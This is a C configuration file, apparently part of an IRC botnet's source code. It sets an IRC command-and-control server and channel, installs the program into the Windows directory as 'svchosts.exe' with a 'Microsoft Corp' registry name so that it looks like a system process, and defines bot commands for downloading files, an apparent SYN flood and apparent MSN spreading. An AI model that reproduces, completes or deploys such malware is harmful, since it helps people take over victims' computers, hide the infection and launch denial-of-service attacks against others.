#include "externs.h"

ircconnect_s ircconnect[] =
{
	{"serv", 81, ""},
	{0, 0, 0}
};
unsigned long cfg_reconnectsleep = 5000; // msec
unsigned long cfg_ircmaxwaittime = 600; // sec
//irc
char cfg_ircchannel[] = "#c";
char cfg_irchost[] = "x";
char cfg_ircchanpass[] = "";
char cfg_ircorderprefix[] = ".";
//install
char cfg_mutex[]    = "C3GGF30CX24F";
char cfg_gotopth[]  = "%windir%";
char cfg_filename[] = "svchosts.exe";
char cfg_regname[]  = "Microsoft Corp";
//commands   
char cmd_silent[]     = "sa"; 	  	  
char cmd_join[]       = "in";
char cmd_part[]       = "out";
char cmd_download[]   = "get";     
char cmd_ssyn[] 	  = "ssyn";
char cmd_msn[]        = "msn";	